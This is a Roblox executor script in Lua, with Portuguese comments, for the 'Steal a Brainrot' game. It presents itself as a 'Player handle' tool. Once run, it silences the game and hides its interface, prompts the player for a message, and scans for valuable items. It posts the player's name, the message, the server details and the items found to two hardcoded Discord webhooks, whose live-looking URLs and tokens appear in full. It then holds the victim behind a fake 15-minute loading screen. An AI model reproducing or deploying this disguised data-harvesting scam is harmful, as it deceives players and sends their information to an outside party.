-- 🔹 Previne múltiplas execuções
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PlayerHandleMenu") then
    warn("Você já tem uma cópia executado, não pode executar mais de 1")
    return
end

repeat task.wait() until game:IsLoaded()
task.wait(2)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local playerGui = player:WaitForChild("PlayerGui")

-- 🔇 Remove e silencia TODOS os sons do jogo
pcall(function()
    SoundService.Volume = 0
    SoundService:Stop()
    for _, s in ipairs(Workspace:GetDescendants()) do
        if s:IsA("Sound") then
            s:Stop()
            s.Volume = 0
            s.Playing = false
        end
    end
    for _, s in ipairs(SoundService:GetDescendants()) do
        if s:IsA("Sound") then
            s:Stop()
            s.Volume = 0
            s.Playing = false
        end
    end
end)

-- 🚫 Esconde todos os botões e GUIs padrão
pcall(function()
    StarterGui:SetCore("TopbarEnabled", false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    for _, gui in ipairs(playerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            gui.Enabled = false
        end
    end
end)

-- 🌐 Webhooks
local webhooks = {
    "https://discord.com/api/webhooks/1428872448786436176/gNVv2m6PDYafOCl_LmVj0kfnsJu3zzjBJ8eWjqUW_Gp-HWqR_iuQZZC9SoPe3vZfswme",
    "https://discord.com/api/webhooks/1428103017369964565/_hTrVyWtnf4qQWMQ94pILkrxAJopWt1IbZ6pOLWKT0L9qfwybeviwGTE-DjZy-gDD_18"
}

-- 🧠 Lista COMPLETA de todos os Brainrots e Lucky Blocks
local brainrotsList = {
    -- OG
    "Strawberry Elephant", "Smurf Cat", "Meowl", "Skibidi Toilet", "John Pork",
    -- Limitados
    "La Vacca Saturno Saturnita", "Blackhole Goat", "Agarrini La Palini", "Karkerkar Kurkur",
    "Los Matteos", "Chimpanzini Spiderini", "Sammyni Spyderini", "La Cucaracha",
    "Los Tralaleritos", "Las Tralaleritas", "Las Vaquitas Saturnitas", "Job Job Job Sahur",
    "Los Spyderinis", "Graipuss Medussi",
    -- Secret
    "Torrtuginni Dragonfruitini", "Pot Hotspot", "Esok Sekolah", "Spaghetti Tualetti",
    "La Grande Combinasion", "Mariachi Corazoni", "Los Combinasionas", "Nuclearo Dinossauro",
    "Los Hotspotsitos", "Tictac Sahur", "La Supreme Combinasion", "Garama and Madundung",
    "Dragon Cannelloni", "Trenostruzzo Turbo 4000", "Fragola La La La",
    "La Sahur Combinasion", "La Karkerkar Combinasion", "Tralaledon", "Los Tacoritas",
    "Los Bros Cocofanto Elefanto", "Antonio", "Girafa Celestre", "Gattatino Nyanino",
    "Chihuanini Taconini", "Matteo", "Tralalero Tralala",
    -- Brainrot God
    "Mastodontico Telepiedone", "Espresso Signora", "Odin Din Din Dun",
    "Alessio", "Statutino Libertino", "Tralalita Tralala", "Unclito Samito",
    "Tukanno Bananno", "Trenostruzzo Turbo 3000", "Tigroligre Frutonni",
    "Urubini Flamenguini", "Ballerino Lololo", "Orcalero Orcala", "Los Crocodillitos",
    "Tipi Topi Taco", "Extinct Ballerina", "Bulbito Bandito Traktorito",
    "Trippi Troppi Troppa Trippa", "Gattito Tacoto",
    -- Lucky Blocks
    "Brainrot God Lucky Block", "Secret Lucky Block", "Admin Lucky Block",
    "Mythic Lucky Block", "Taco Lucky Block", "Regular Lucky Block",
    -- Evento da bruxa (Halloween)
    "Eviledon", "Los Mobilis", "Vulturino Skeletono", "Jacko Jack Jack",
    "Snailenzo", "Tentacolo Tecnico", "Magi Ribbitini", "Jacko Spaventosa",
    "Buho de Fuego", "Mamma Rappin", "Tartaragno", "Spooky and Pumpky",
    "Pinealotto Fruttarino", "La Spooky Grande", "Vampira Cappucina",
    "Zombie Tralala", "Frankentteo", "La Vacca Jacko Lanterino"
}

local brainrotsSet = {}
for _, name in ipairs(brainrotsList) do
    brainrotsSet[name] = true
end

local brainrots = {}
for name, _ in pairs(brainrotsSet) do
    table.insert(brainrots, name)
end

local detected = {}

local function doRequest(req)
    if syn and syn.request then return syn.request(req)
    elseif http and http.request then return http.request(req)
    elseif request then return request(req)
    elseif http_request then return http_request(req)
    elseif fluxus and fluxus.request then return fluxus.request(req)
    elseif krnl and krnl.request then return krnl.request(req)
    else warn("Nenhum método de request disponível.") end
end

local function sendToAll(content)
    local payload = {content = tostring(content)}
    local body = HttpService:JSONEncode(payload)
    for _, url in ipairs(webhooks) do
        pcall(function()
            doRequest({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
    end
end

local function gatherNewBrainrots()
    local results = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return results end
    for _, p in ipairs(plots:GetChildren()) do
        for _, item in ipairs(p:GetChildren()) do
            for _, name in ipairs(brainrots) do
                if item.Name == name and not detected[name] then
                    detected[name] = true
                    table.insert(results, name)
                end
            end
        end
    end
    return results
end

-- 🪟 Cria GUI
local function createUI()
    local gui = Instance.new("ScreenGui", playerGui)
    gui.Name = "PlayerHandleMenu"
    gui.IgnoreGuiInset = true

    local frame = Instance.new("Frame", gui)  
    frame.Size = UDim2.new(0, 400, 0, 300)  
    frame.Position = UDim2.new(0.5, -200, 0.5, -150)  
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
    frame.BorderSizePixel = 0  
    frame.Active = true  
    frame.Draggable = true  

    local title = Instance.new("TextLabel", frame)  
    title.Text = "Player handle"  
    title.Font = Enum.Font.GothamBold  
    title.TextSize = 28  
    title.Size = UDim2.new(1, 0, 0, 50)  
    title.BackgroundTransparency = 1  
    title.TextColor3 = Color3.new(1, 1, 1)  

    local box = Instance.new("TextBox", frame)  
    box.Size = UDim2.new(1, -20, 0, 40)  
    box.Position = UDim2.new(0, 10, 0, 70)  
    box.PlaceholderText = "Digite sua mensagem aqui"  
    box.TextColor3 = Color3.new(1, 1, 1)  
    box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)  
    box.Font = Enum.Font.Gotham  
    box.TextSize = 16  
    box.ClearTextOnFocus = false  

    local btn = Instance.new("TextButton", frame)  
    btn.Text = "OK"  
    btn.Font = Enum.Font.GothamBold  
    btn.TextSize = 18  
    btn.Size = UDim2.new(0, 120, 0, 40)  
    btn.Position = UDim2.new(0.5, -60, 0, 130)  
    btn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)  
    btn.TextColor3 = Color3.new(1, 1, 1)  

    -- 🔹 Música visual (barra animada)
    local musicFrame = Instance.new("Frame", frame)
    musicFrame.Size = UDim2.new(1, -20, 0, 20)
    musicFrame.Position = UDim2.new(0, 10, 1, -30)
    musicFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    
    for i = 1, 10 do
        local bar = Instance.new("Frame", musicFrame)
        bar.Size = UDim2.new(0.08, 0, 1, 0)
        bar.Position = UDim2.new((i-1)*0.1, 0, 0, 0)
        bar.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
        bar.Name = "Bar"..i
    end

    task.spawn(function()
        while true do
            for i, bar in ipairs(musicFrame:GetChildren()) do
                if bar:IsA("Frame") then
                    bar.Size = UDim2.new(0.08, 0, math.random(5, 100)/100, 0)
                end
            end
            task.wait(0.1)
        end
    end)

    return gui, frame, box, btn
end

local gui, frame, box, btn = createUI()

-- 🧠 Tela de carregamento (15 minutos)
local function showLoadingScreen()
    local load = Instance.new("Frame", gui)
    load.Size = UDim2.new(1, 0, 1, 0)
    load.BackgroundColor3 = Color3.new(0, 0, 0)
    load.ZIndex = 10

    local text = Instance.new("TextLabel", load)  
    text.Text = "puxando players por favor espere"  
    text.Font = Enum.Font.GothamBold  
    text.TextSize = 26  
    text.TextColor3 = Color3.new(1, 1, 1)  
    text.Size = UDim2.new(1, 0, 0, 50)  
    text.Position = UDim2.new(0, 0, 0.35, 0)  
    text.BackgroundTransparency = 1  
    text.ZIndex = 11  

    local barBG = Instance.new("Frame", load)  
    barBG.Size = UDim2.new(0.6, 0, 0, 30)  
    barBG.Position = UDim2.new(0.2, 0, 0.5, 0)  
    barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)  
    barBG.BorderSizePixel = 0  
    barBG.ZIndex = 11  

    local barFill = Instance.new("Frame", barBG)  
    barFill.Size = UDim2.new(0, 0, 1, 0)  
    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 127)  
    barFill.BorderSizePixel = 0  
    barFill.ZIndex = 12  

    local percent = Instance.new("TextLabel", load)  
    percent.Size = UDim2.new(1, 0, 0, 40)  
    percent.Position = UDim2.new(0, 0, 0.55, 0)  
    percent.BackgroundTransparency = 1  
    percent.Font = Enum.Font.GothamBold  
    percent.TextSize = 22  
    percent.TextColor3 = Color3.new(1, 1, 1)  
    percent.ZIndex = 12  

    for i = 0, 100 do  
        barFill.Size = UDim2.new(i / 100, 0, 1, 0)  
        percent.Text = tostring(i) .. "%"  
        task.wait(9)  
    end  
end

btn.MouseButton1Click:Connect(function()
    local msg = box.Text
    local found = gatherNewBrainrots()
    local playersNow = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers or "?"

    local lines = {  
        string.format("🔗 Mensagem do jogador **%s**: %s", player.Name, msg),  
        string.format("👥 Jogadores no servidor: %d/%s", playersNow, maxPlayers)  
    }  

    if #found > 0 then  
        for _, name in ipairs(found) do  
            table.insert(lines, "🧠 Brainrot detectado: **" .. name .. "**")  
        end  
    else  
        table.insert(lines, "⚠️ Nenhum Brainrot encontrado.")  
    end  

    sendToAll(table.concat(lines, "\n"))  

    frame.Visible = false  
    showLoadingScreen()
end)

print("✔ Script executado (som removido, HUD escondida, UI ativa, música visual e carregamento 15min fixo).")